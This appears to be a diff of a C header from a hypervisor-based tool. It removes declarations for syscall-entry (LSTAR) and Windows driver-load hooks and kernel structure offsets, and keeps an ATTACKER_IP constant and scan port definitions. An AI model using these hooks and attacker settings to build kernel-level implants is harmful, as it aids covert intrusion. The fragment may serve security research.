@@ -11,17 +11,6 @@
 #define INT3_OPCODE 0xcc
 #define INT3 0x3
 
-extern void handle_lstar_write(uint64_t lstar);
-extern void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state);
-
-#define KLDR_DATA_TABLE_ENTRY_Flink(x) (x)
-#define KLDR_DATA_TABLE_ENTRY_Blink(x) ((x)+8)
-#define KLDR_DATA_TABLE_ENTRY_DllBase(x) ((x)+0x30)
-#define KLDR_DATA_TABLE_ENTRY_BaseDllName(x) ((x)+0x58)
-
-#define UNICODE_STRING_Length(x) (x)
-#define UNICODE_STRING_Buffer(x) ((x)+8)
-
 #define ATTACKER_IP 0xac1cb73f  // 172.28.183.63
 #define SRC_PORT 49321
 #define DST_SCAN_PORT 49323
